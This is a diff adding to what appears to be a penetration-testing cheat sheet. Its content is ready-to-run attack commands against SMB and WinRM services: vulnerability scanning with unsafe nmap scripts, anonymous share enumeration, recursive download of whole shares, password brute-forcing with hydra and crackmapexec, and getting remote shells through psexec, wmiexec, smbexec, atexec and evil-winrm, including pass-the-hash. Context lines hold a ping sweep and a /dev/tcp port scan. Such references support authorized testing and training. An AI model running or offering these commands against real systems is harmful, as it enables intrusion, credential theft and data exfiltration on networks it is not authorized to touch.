@@ -3,7 +3,55 @@ BASH/TERM > for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" 
 BASH/TERM > for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
 
 SMB
+
+nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
+smbmap -H <IP>
+smbmap -u '' -p '' -H <IP>
+smbmap -u 'guest' -p '' -H <IP>
+smbmap -u '' -p '' -H <IP> -R
+
+crackmapexec smb <IP>
+crackmapexec smb <IP> -u '' -p ''
+crackmapexec smb <IP> -u 'guest' -p ''
+crackmapexec smb <IP> -u '' -p '' --shares
+
+enum4linux -a <IP>
+
 smbclient --list //<Target_IP>/ -U ""
+smbclient --no-pass -L //$IP
+smbclient //<IP>/<SHARE>
+
+# Download all files from a directory recursively
+smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
+Brute force
+crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
+hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
+Mount a SMB share
+mkdir /tmp/share
+sudo mount -t cifs //<IP>/<SHARE> /tmp/share
+sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share
+
+smbclient //<IP>/<SHARE>
+smbclient //<IP>/<SHARE> -U <USER>
+Get a shell
+psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
+atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+WINRM - 5985 - 5986
+Brute force
+crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
+Connecting
+evil-winrm -i <IP> -u <USER> -p <PASSWORD>
+evil-winrm -i <IP> -u <USER> -H <HASH>
 
 REMOTE ENUMERATION
 gobuster dir -u http://<ip>:80 -w <wordlist> 
